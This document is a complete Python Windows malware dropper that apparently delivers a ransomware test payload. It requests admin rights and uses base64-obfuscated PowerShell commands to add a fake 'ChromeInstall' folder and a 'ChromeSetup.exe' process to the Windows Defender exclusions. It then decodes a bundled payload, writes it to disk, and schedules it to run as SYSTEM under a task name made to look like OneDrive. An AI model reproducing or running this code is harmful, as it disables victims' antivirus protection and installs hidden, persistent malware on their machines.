from B64 import *
import os
import sys
import ctypes
import subprocess
import win32com.client
import time

class Dropper:

    def __init__(self):
        self.username = self.get_username()
        self.folder_path = ""
        self.decoded_payload = ""
        self.path = ""
        self.encodeclass = Encode()

    def get_username(self):
        username = os.getlogin()

        print(f"[LOG] user: {username}")
        return username
        
    def is_admin(self):
        """a function which checks if running on admin privelages"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False

    def run_as_admin(self):
        """
        a function which requests for admin privelages
        """
        script = sys.argv[0]
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)

    def create_obfuscated_folder(self):
        """
        a method that creates a folder where real time protection antivirus doesnt exist
        """

        self.folder_path = f"C:\\Users\\{self.username}\\Documents\\ChromeInstall" 
        os.mkdir(self.folder_path)
        

        part_1 = "cG93ZXJzaGVsbC5leGUgLUNvbW1hbmQ="
        part_2 = "IkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGg="

        command = f'{(self.encodeclass.decode(part_1)).decode('utf-8')} {(self.encodeclass.decode(part_2)).decode('utf-8')} \'{self.folder_path}\'"' # B64 to disable real time scanning in specific foilder

        try:
            subprocess.run(command, shell=True, check=True)
            print(f"Folder {self.folder_path} has been added to WD exclusions.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to add exclusion: {e}")

    def decode_payload(self):
        """
        a method that wil decoe the payload
        """

        text_file_path = os.path.join(sys._MEIPASS, 'binaries.txt')

        with open(text_file_path, "r") as malicious_payload:
            encoded_payload = malicious_payload.read()
            self.decoded_payload = self.encodeclass.decode(encoded_payload)


    def write_payload(self):
        """
        a method that will write the payload in the obfuscated folder
        """
        self.path = f"{self.folder_path}\\ChromeSetup.exe"
        with open(self.path, "wb") as text_file:
            text_file.write(self.decoded_payload)

    def execute_payload(self):
        """
        a function which will schedule a task  to execute the payload
        """
        scheduler = win32com.client.Dispatch('Schedule.Service')
        scheduler.Connect()

        # Define Task
        task_definition = scheduler.NewTask(0)
        task_definition.RegistrationInfo.Description = 'OneDrive Startup Task-RANSOMWARETEST'
        #task_definition.RegistrationInfo.Author = 'Microsoft'


        # Create an action to run the EXE file
        action = task_definition.Actions.Create(0)  # 0 = Execute
        action.Path = self.path # Exe


        # Create a trigger to run immediately
        trigger = task_definition.Triggers.Create(1)  # 1 = At logon
        start_time = time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(time.time() + 3605))  # Start in 1h (time is one hour behind); so actually starts in 10s
        trigger.StartBoundary = start_time  

        # Define the task to run with highest privileges and SYSTEM user
        task_definition.Principal.UserId = 'NT AUTHORITY\\SYSTEM'
        task_definition.Principal.LogonType = 3  # Service Account
        task_definition.Principal.RunLevel = 1  # Highest privileges

        # Register the task
        folder = scheduler.GetFolder('\\')
        folder.RegisterTaskDefinition('OneDrive Startup Task-RANSOMWARETEST', task_definition, 6, None, None, 3, None)  # 6 = Create or update

        print("Scheduled task created successfully!")

    def exclude_exe(self):
        part_1 = "cG93ZXJzaGVsbC5leGUgQWRkLU1wUHJlZmVyZW5jZQ=="
        part_2 = "LUV4Y2x1c2lvblByb2Nlc3MgIkNocm9tZVNldHVwLmV4ZSI="

        command = f'{(self.encodeclass.decode(part_1)).decode('utf-8')} {(self.encodeclass.decode(part_2)).decode('utf-8')}' # B64 to disable real time scanning in specific foilder

        try:
            subprocess.run(command, shell=True, check=True)
            print(f"exe has been added to WD exclusions.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to add exclusion: {e}")
    

if __name__ == "__main__":

    #initiate dropper class
    dropper = Dropper()

    if not dropper.is_admin():
        print("Dit script vereist administratorrechten.")
        dropper.run_as_admin()
        sys.exit(0)

    dropper.create_obfuscated_folder()
    dropper.decode_payload()
    dropper.write_payload()
    dropper.exclude_exe()
    dropper.execute_payload()




    



    